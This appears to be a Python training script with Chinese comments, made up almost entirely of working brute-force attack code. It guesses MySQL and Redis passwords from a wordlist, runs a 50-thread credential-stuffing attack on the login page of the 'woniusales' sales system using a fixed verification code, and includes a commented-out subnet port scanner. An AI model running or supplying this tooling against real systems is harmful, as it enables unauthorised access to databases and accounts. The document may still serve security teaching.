"""
# 这里实现的是爆破端口的功能
【4. 爆破：1. 3306，2. 6379，3. 服务器】，
"""
import pymysql
import redis
import ipaddress
import os
import socket
import threading
from threading import Thread
import time
from concurrent.futures import ThreadPoolExecutor
from queue import Queue
import requests

# 爆破MySQL(3306)
class MySQLBurp:
    def __init__(self, ip, password_file="password.txt", user="root", port=3306):
        self.ip = ip
        self.password_file = password_file
        self.user = user
        self.port = port

    def burp(self):
        with open(self.password_file, mode="r", encoding="utf-8") as f:
            pass_list = f.readlines()
        for password in pass_list:
            try:
                passwd = password.strip()
                pymysql.connect(host=self.ip, user=self.user, password=passwd, port=self.port)
                print(f"登录成功，密码是{passwd}")
                break  # 如果登录成功，立即停止尝试其他密码
            except pymysql.err.OperationalError:
                pass

# 爆破Redis(6379)
class RedisBurp:
    def __init__(self, password_file="password.txt", socket_timeout=5):
        self.password_file = password_file
        self.socket_timeout = socket_timeout

    def burp(self, ip):
        with open(self.password_file, mode="r", encoding="utf-8") as f:
            pass_lst = [item.strip() for item in f.readlines()]  # 去除空白字符
        for item in pass_lst:
            try:
                rds = redis.Redis(host=ip, password=item, port=6379, socket_timeout=self.socket_timeout)  # 设置端口和超时
                rds.ping()
                print(f"密码 {item} 正确")
                break
            except redis.exceptions.AuthenticationError:
                pass


# 爆破服务器
# 爆破woniusales（蜗牛进销存）服务器
def brute_sever(username, password, url):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
    data = {'username': username.strip(), 'password': password.strip(), 'verifycode': '0000'}
    resp = requests.post(url=url, data=data, headers=headers)
    if 'login-fail' not in resp.text:
        print(f"爆破成功，用户名为：{username.strip()}，密码为：{password.strip()}")
    time.sleep(1)


def login_burp_server(url):
    with open("./user.txt") as f:
        user_list = f.readlines()

    with open('./password.txt') as f:
        pwd_list = f.readlines()

    with ThreadPoolExecutor(max_workers=50) as executor:
        for username in user_list:
            for password in pwd_list:
                executor.submit(brute_sever, username, password, url)
'''
def burp_port(port):
    # 创建队列
    q = Queue()
    # 创建线程
    for i in range(1, 255):
        ip = f"192.168.4.{i}"
        q.put(ip)
        # print(f"正在扫描{ip}的{port}端口")
    # 创建线程
    for i in range(100):
        t = threading.Thread(target=scan_port, args=(q, port))
        t.start()
        time.sleep(0.5)

def scan_port(ip, port):
    try:
        s = socket.socket()
        s.settimeout(1)
        s.connect((ip, port))
        print(f"{ip}:{port}可达")
    except:
        pass
    finally:
        s.close()

# 扫描指定IP的指定端口(3306,6379)
def scan_port(q, port):
    while not q.empty():
        ip = q.get()
        try:
            # 创建socket对象
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # 设置超时时间
            s.settimeout(0.5)
            # 连接
            s.connect((ip, port))
            print(f"{ip}的{port}端口开放")
            s.close()
        except:
            pass
        q.task_done()
'''